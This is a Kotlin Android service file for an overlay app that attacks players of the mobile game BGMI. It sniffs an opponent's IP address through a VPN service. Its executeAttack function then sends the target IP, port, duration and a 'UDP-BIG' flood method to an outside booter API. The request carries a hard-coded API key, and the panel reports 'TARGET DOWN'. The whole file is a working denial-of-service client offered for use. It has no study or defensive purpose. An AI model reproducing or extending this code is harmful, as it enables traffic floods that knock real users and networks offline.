package com.teamjadugar.apk

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import java.net.HttpURLConnection
import java.net.URL

class FloatingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var bubbleView: View
    
    private lateinit var etIp: EditText
    private lateinit var etPort: EditText
    private lateinit var tvTime: TextView
    private lateinit var btnAttack: Button
    private lateinit var btnGetIp: Button
    private lateinit var tvLog: TextView
    private var selectedTime = 120
    private var attackTimer: Thread? = null

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip)
                etPortRef?.setText(port)
                btnGetIpRef?.text = "IP FOUND ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Caught: $ip", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private val paramsPanel = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
        PixelFormat.TRANSLUCENT
    )

    private val paramsBubble = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
        PixelFormat.TRANSLUCENT
    )

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        paramsPanel.gravity = Gravity.TOP or Gravity.START
        paramsPanel.x = 50
        paramsPanel.y = 150
        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)

        paramsBubble.gravity = Gravity.TOP or Gravity.START
        paramsBubble.x = 50
        paramsBubble.y = 150
        bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)

        windowManager.addView(floatingView, paramsPanel)

        etIp = floatingView.findViewById(R.id.fEtIp)
        etPort = floatingView.findViewById(R.id.fEtPort)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        tvLog = floatingView.findViewById(R.id.tvLog)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
        
        etIpRef = etIp
        etPortRef = etPort
        btnGetIpRef = btnGetIp

        floatingView.findViewById<TextView>(R.id.btnClose).setOnClickListener { stopSelf() }
        floatingView.findViewById<TextView>(R.id.btnMinimize).setOnClickListener {
            windowManager.removeView(floatingView)
            windowManager.addView(bubbleView, paramsBubble)
        }

        setupBubbleDrag()
        
        bubbleView.setOnClickListener {
            windowManager.removeView(bubbleView)
            windowManager.addView(floatingView, paramsPanel)
        }

        seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = 60 + (progress * 10) 
                tvTime.text = "ATTACK DURATION: ${selectedTime}s"
            }
            override fun onStartTrackingTouch(seekBar: SeekBar?) {}
            override fun onStopTrackingTouch(seekBar: SeekBar?) {}
        })

        btnGetIp.setOnClickListener {
            tvLog.text = "> SNIFFING BGMI..."
            btnGetIp.text = "SNIFFING..."
            btnGetIp.isEnabled = false
            startService(Intent(this, VpnService::class.java))
        }

        btnVpnOff.setOnClickListener {
            stopService(Intent(this, VpnService::class.java))
            tvLog.text = "> VPN STOPPED"
            btnGetIp.text = "GET IP"
            btnGetIp.isEnabled = true
            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
            btnGetIp.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
        }

        btnAttack.setOnClickListener {
            val ip = etIp.text.toString().trim()
            val port = etPort.text.toString().trim()
            if (ip.isEmpty() || port.isEmpty()) {
                Toast.makeText(this, "IP or Port missing!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnAttack.text = "LAUNCHING..."
            btnAttack.isEnabled = false
            startAttackTimer(ip, port, selectedTime)
        }

        setupPanelDragAndResize()
    }

    private fun startAttackTimer(ip: String, port: String, time: Int) {
        executeAttack(ip, port, time)
        
        attackTimer?.interrupt()
        attackTimer = Thread {
            try {
                var remaining = time
                while (remaining > 0) {
                    Handler(Looper.getMainLooper()).post {
                        tvLog.text = "> ATTACKING: ${remaining}s left"
                        tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                    }
                    Thread.sleep(1000)
                    remaining--
                }
                Handler(Looper.getMainLooper()).post {
                    tvLog.text = "> ATTACK COMPLETED"
                    tvLog.setTextColor(android.graphics.Color.parseColor("#22C55E"))
                    btnAttack.text = "LAUNCH ATTACK 🚀"
                    btnAttack.isEnabled = true
                }
            } catch (e: InterruptedException) {}
        }
        attackTimer?.start()
    }

    private var initialX = 0
    private var initialY = 0
    private var initialTouchX = 0f
    private var initialTouchY = 0f

    private fun setupPanelDragAndResize() {
        val header = floatingView.findViewById<LinearLayout>(R.id.headerLayout)
        header.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = paramsPanel.x
                    initialY = paramsPanel.y
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    paramsPanel.x = initialX + (event.rawX - initialTouchX).toInt()
                    paramsPanel.y = initialY + (event.rawY - initialTouchY).toInt()
                    windowManager.updateViewLayout(floatingView, paramsPanel)
                    true
                }
                else -> false
            }
        }

        val resizeHandle = floatingView.findViewById<ImageView>(R.id.resizeHandle)
        var initialWidth = 0
        var initialHeight = 0
        resizeHandle.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialWidth = floatingView.width
                    initialHeight = floatingView.height
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val newWidth = initialWidth + (event.rawX - initialTouchX).toInt()
                    val newHeight = initialHeight + (event.rawY - initialTouchY).toInt()
                    paramsPanel.width = if (newWidth > 280) newWidth else 280
                    paramsPanel.height = if (newHeight > 200) newHeight else WindowManager.LayoutParams.WRAP_CONTENT
                    windowManager.updateViewLayout(floatingView, paramsPanel)
                    true
                }
                else -> false
            }
        }
    }

    private var bubbleInitialX = 0
    private var bubbleInitialY = 0
    private var bubbleInitialTouchX = 0f
    private var bubbleInitialTouchY = 0f
    private var isBubbleDragging = false

    private fun setupBubbleDrag() {
        bubbleView.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    bubbleInitialX = paramsBubble.x
                    bubbleInitialY = paramsBubble.y
                    bubbleInitialTouchX = event.rawX
                    bubbleInitialTouchY = event.rawY
                    isBubbleDragging = false
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = event.rawX - bubbleInitialTouchX
                    val dy = event.rawY - bubbleInitialTouchY
                    if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
                        isBubbleDragging = true
                        paramsBubble.x = bubbleInitialX + dx.toInt()
                        paramsBubble.y = bubbleInitialY + dy.toInt()
                        windowManager.updateViewLayout(bubbleView, paramsBubble)
                    }
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isBubbleDragging) bubbleView.performClick()
                    true
                }
                else -> false
            }
        }
    }

    private fun executeAttack(ip: String, port: String, time: Int) {
        Thread {
            var conn: HttpURLConnection? = null
            try {
                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                val apiKey = "sp_live_065a318078f3efc19e0be720102e9a7e"

                var finalIp = ip
                var finalPort = port
                if (ip.contains(":")) {
                    val parts = ip.split(":")
                    finalIp = parts[0]
                    finalPort = parts[1]
                }

                val url = URL(apiUrl)
                conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", apiKey)
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout = 8000

                val jsonInput = """{"target":"$finalIp","port":$finalPort,"duration":$time,"method":"UDP-BIG"}"""
                conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }

                val responseCode = conn.responseCode
                var responseMsg = conn.responseMessage
                
                if (responseCode != 200 && responseCode != 201) {
                    try {
                        val errorBody = conn.errorStream?.bufferedReader()?.readText()
                        if (!errorBody.isNullOrEmpty()) {
                            responseMsg = errorBody.take(40)
                        }
                    } catch (e: Exception) {}
                }

                Handler(Looper.getMainLooper()).post {
                    if (responseCode in 200..201) {
                        btnAttack.text = "LAUNCHED ✅"
                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                        tvLog.text = "> SUCCESS! TARGET DOWN"
                    } else {
                        btnAttack.text = "LAUNCH ATTACK 🚀"
                        btnAttack.isEnabled = true
                        tvLog.text = "> FAIL: $responseCode $responseMsg"
                        Toast.makeText(this@FloatingService, "Error: $responseMsg", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    btnAttack.text = "LAUNCH ATTACK 🚀"
                    btnAttack.isEnabled = true
                    tvLog.text = "> NETWORK FAIL"
                    Toast.makeText(this@FloatingService, "Net Err: ${e.message?.take(20)}", Toast.LENGTH_LONG).show()
                }
            } finally {
                conn?.disconnect()
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            if (::floatingView.isInitialized) windowManager.removeView(floatingView)
            if (::bubbleView.isInitialized) windowManager.removeView(bubbleView)
            attackTimer?.interrupt()
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
